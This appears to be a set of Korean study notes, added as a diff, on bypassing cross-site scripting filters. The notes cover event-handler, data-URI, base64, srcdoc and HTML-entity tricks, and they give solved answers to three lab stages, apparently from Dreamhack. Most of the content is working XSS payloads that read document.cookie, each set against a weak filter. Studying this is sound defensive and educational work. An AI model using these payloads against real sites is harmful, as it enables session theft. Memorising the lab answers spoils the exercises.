@@ -1,0 +1,176 @@
+Tag and type Filtering :
+    코드를 실행할 수 있는 HTML 요소는 <script> 이외에도 상당수 존재합니다.
+
+    스크립트를 포함할 수 있는 속성 : 
+        - on으로 시작하는 속성들 등등
+        - src로 시작하는 태그
+        - href 등등 
+        - srcdoc 은 html code를 값으로 받는다.
+        - HTML Entity 활용 :	&nbsp;, &lt; 등등
+    load, error :
+        ex)
+            <!-- 해당 태그가 요청하는 데이터 로드 후 실행 (로드 실패 시 실행되지 않음). -->
+            <img src="valid.jpg" onload="alert(document.domain)">
+            <!-- → 유효한 이미지 로드 후 onload 실행. -->
+            
+            <img src="about:invalid" onload="alert(document.domain)">
+            <!-- → 이미지 로드 실패, onload 실행하지 않음. -->
+            
+            <!-- 해당 태그가 요청하는 데이터 로드 실패 시 실행 (로드 성공 시 실행되지 않음). -->
+            <img src="about:invalid" onerror="alert(document.domain)">
+            <!-- → 이미지 로드 실패, onerror 실행. -->
+            
+            <!-- input 태그에 포커스가 되면 실행되는 이벤트 핸들러 -->
+            <input type="text" id="inputID" onfocus="alert(document.domain)" autofocus>
+            <!-- "autofocus" 옵션을 통해 자동으로 포커스를 시키거나, 
+            URL의 hash 부분에 input id를 입력(e.g. http://dreamhack.io/#inputID)하면 포커스 되도록 하여 이벤트 핸들러가 실행되도록 합니다.
+            ※ 포커스가 될 수 없는 "hidden" type에서는 동작하지 않는 이벤트 핸들러입니다.
+            -->
+
+    다른 이벤트 태그들 : https://developer.mozilla.org/ko/docs/Web/Events
+
+    요소의 속성값 또한 &lt; 와 같은 HTML 엔티티를 포함할 수 있어 본래 코드를 숨길 때에 사용될 수 있습니다.
+    단순히 태그나 속성을 바탕으로 필터를 하게 되면 우회가 가능한 경우가 많습니다. 
+
+    취약한 필터의 예시
+    ex) 대문자 혹은 소문자만을 인식하는 필터 우회
+
+        x => !x.includes('script') && !x.includes('On')
+        --> <sCRipT>alert(document.cookie)</scriPT>
+        --> <img src=x: oneRroR=alert(document.cookie) />
+
+    잘못된 정규표현식을 사용한 필터 우회
+    ex)
+        x => !/<script[^>]*>[^<]/i.test(x)
+        --> <sCrIpt src=data:,alert(document.cookie)></SCRipt>
+        // 스크립트 태그 내에 데이터가 존재하는지 확인하는 필터링 -> src 속성을 이용하여 데이터 입력.
+        
+        x => !/<script[^>]*>[^<]/i.test(x) && !x.includes('document')
+        --> <sCrIpt src=data:;base64,YWxlcnQgKGRvY3VtZW50LmNvb2tpZSk7></SCRipt>
+        // base64 인코딩을 통해 필터링 우회
+       
+        x => !/<img[^>]*onerror/i.test(x)
+        --> <<img src=> onerror=alert(document.cookie)>
+        --> <img src='>' onerror=alert(document.cookie)//\>
+        
+        x => !/<img([^>]|['"][^'"]*['"])+onerror/i.test(x)
+        --> <img src=">'>" onerror=alert(document.cookie) />
+       
+        x => !/<img.*on/i.test(x)
+        --> <img src=""
+            onerror = alert(document.cookie) />
+        // 멀티라인에 대한 검증이 존재하지 않아 줄바꿈을 통해 필터링 우회.
+
+        data: schema를 앞에 지정한 경우 뒤에 오는 데이터를 blob으로 설정하여 데이터에 삽입합니다.
+
+        예)
+        data:Hello! : Hello!를 데이터로
+        data:text/html,alert('hi'); : alert('hi'); 데이터를 text/html 형태로 삽입
+        data:image/jpg,iVBORw0KGgoAAAANSUhEUgAAAAUAAAA...;base64 : 해당 데이터를 base64 decode 이후 삽입
+
+    특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회
+    ex)
+        x => !/img|onload/i.test(x)
+        --> <video><source onerror=alert(document.cookie) /></video>
+        
+        x => !/onerror/i.test(x)
+        --> <body onload=alert(document.cookie) />
+        
+        x => !/<\s*body/i.test(x)
+        --> <iframe src=jaVaSCRipt:alert(parent.document.cookie) />
+       
+        x => !/onerror|javascript/i.test(x)
+        --> <iframe srcdoc="<img one&#114;&#114;or=alert(parent.document.cookie)" />
+
+실습 : 
+    stage 1 : 필터링 우회해서 alert 실행
+
+    function XSSFilter(data){
+        if(data.includes('script')){
+            return false;
+        }
+        return true;
+    }
+
+    1. script 필터
+        답 : <sCript>alert("hello")</scriPt> // 대소문자 필터 없음
+    
+        // 필터링 코드
+        function XSSFilter(data){
+            if(data.includes('script')){
+                return false;
+            }
+            return true;
+        }
+        /* 
+        "script" 문자열이 포함되어 있는지 확인하는 필터링입니다.
+        하지만 대소문자에 대한 검증이 충분하지 않기 때문에 대소문자를 혼용하여 필터를 우회할 수 있습니다.
+        */
+        <sCRipT>alert(document.domain);</scriPT>
+
+    stage 2 : 필터링 우회해서 alert 실행
+
+        function XSSFilter(data){
+            if(data.toLowerCase().includes('script')){
+                return false;
+            }
+            return true;
+        }
+
+        답 : <body onload="alert(document.domain)"/> // 데이터로 받은 값을 전부 소문자로 만들어 script 단어 자체 필터링. 우회로 다른 태그 사용
+
+        function XSSFilter(data){
+            if(data.toLowerCase().includes('script')){
+                return false;
+            }
+            return true;
+        }
+
+        /* 
+        입력된 data를 소문자로 변환한 후 "script" 문자열이 포함되어 있는지 확인하는 필터링입니다.
+        "script" 태그 외에도 스크립트를 실행 시킬 수 있는 태그들의 이벤트 핸들러를 사용하여 우회할 수 있습니다.
+        */
+        <img src=about: onerror=alert(document.domain)>
+        <svg src=about: onload=alert(document.domain)>
+        <body onload=alert(document.domain)>
+        <video><source onerror=alert(document.domain)></video>
+
+    stage 3 : 필터링 우회해서 alert 실행
+
+        function XSSFilter(data){
+            if(data.toLowerCase().includes('script') ||
+                data.toLowerCase().includes('on')){
+                return false;
+            }
+            return true;
+        }
+
+        답 : <iframe srcdoc="<img src=about: o&#110;error=parent.alert(document.domain)>"" />
+        // about:blank = 공백, 빈페이지
+
+        function XSSFilter(data){
+        if(data.toLowerCase().includes('script') || 
+            data.toLowerCase().includes('on')){
+            return false;
+        }
+        return true;
+        }
+
+        /* 
+        입력된 data를 소문자로 변환한 후 "script" 문자열과 "on" 문자열이 포함되어 있는지 확인하는 필터링입니다.
+        script 태그와 on* 이벤트핸들러 외에도 XSS으로 사용될 수 있는 태그들을 이용하면 됩니다.
+        */
+        <iframe srcdoc='<img src=about: o&#110;error=parent.alert(document.domain)>'></iframe>
+        /*
+        "parent.alert" 를 호출하는 이유는 무엇인가요?
+        XSS 페이로드 스크립트는 iframe안에서 호출됩니다.
+        문제를 풀기 위해 alert를 호출하려면, 스크립트가 호출되는 영역의 상위 문서에 존재하는 alert를 호출해야 합니다. 
+        */
+
+
+
+
+
+
+
+
